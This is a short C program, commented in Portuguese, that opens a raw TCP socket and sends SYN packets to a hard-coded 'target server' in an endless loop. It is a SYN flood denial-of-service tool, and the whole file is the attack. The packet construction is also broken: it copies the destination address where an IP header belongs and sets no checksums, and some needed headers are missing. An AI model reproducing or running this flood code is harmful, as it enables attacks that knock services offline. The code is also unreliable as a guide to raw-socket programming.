#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>

#define DEST_ADDR "192.168.0.1" // Endereço IP do servidor alvo
#define DEST_PORT 80            // Porta de destino
#define SRC_ADDR "192.168.0.2"  // Endereço IP do remetente
#define SRC_PORT 5555           // Porta de origem

int main(int argc, char *argv[]) {
    int sockfd;
    struct sockaddr_in dest_addr;
    struct tcphdr tcp;
    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    int one = 1;
    const int *val = &one;

    // Cria o socket
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd == -1) {
        perror("Erro ao criar socket");
        exit(1);
    }

    // Define opções do socket
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("Erro ao definir opções de socket");
        exit(1);
    }

    // Configura endereço de destino
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = inet_addr(DEST_ADDR);
    dest_addr.sin_port = htons(DEST_PORT);

    // Configura cabeçalho TCP
    memset(&tcp, 0, sizeof(tcp));
    tcp.th_sport = htons(SRC_PORT);
    tcp.th_dport = htons(DEST_PORT);
    tcp.th_flags = TH_SYN;
    tcp.th_seq = random();
    tcp.th_win = 2048;

    // Monta pacote
    memcpy(packet, &dest_addr.sin_addr, sizeof(dest_addr.sin_addr));
    memcpy(packet + sizeof(dest_addr.sin_addr), &tcp, sizeof(tcp));

    // Envia pacotes
    while (1) {
        if (sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
            perror("Erro ao enviar pacote");
            exit(1);
        }
    }

    return 0;
}
